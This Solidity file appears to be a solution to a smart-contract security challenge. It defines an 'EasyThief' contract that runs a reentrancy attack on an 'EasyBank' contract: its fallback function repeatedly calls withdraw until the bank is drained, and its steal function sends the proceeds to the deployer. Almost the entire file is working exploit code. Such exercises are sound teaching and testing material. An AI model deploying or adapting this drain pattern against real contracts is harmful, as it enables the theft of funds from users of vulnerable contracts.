//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

import "hardhat/console.sol";

import "./EasyBank.sol";

contract EasyThief {
    address easyThief;
    EasyBank easyBank;

    constructor(address easyBankAddress) {
        easyThief = msg.sender;
        easyBank = EasyBank(easyBankAddress);
    }

    //
    // CHALLENGE: EXCECUTE PART OF THE EXPLOIT HERE
    //
    fallback() external payable {
        if (address(easyBank).balance >= msg.value) {
            easyBank.withdraw();
        }
    }

    //
    // CHALLENGE: EXCECUTE PART OF THE EXPLOIT HERE
    //
    function steal() external payable {
        easyBank.deposit{value: msg.value}();
        easyBank.withdraw();

        (bool success, ) = easyThief.call{value: address(this).balance}("");
        require(success);
    }
}
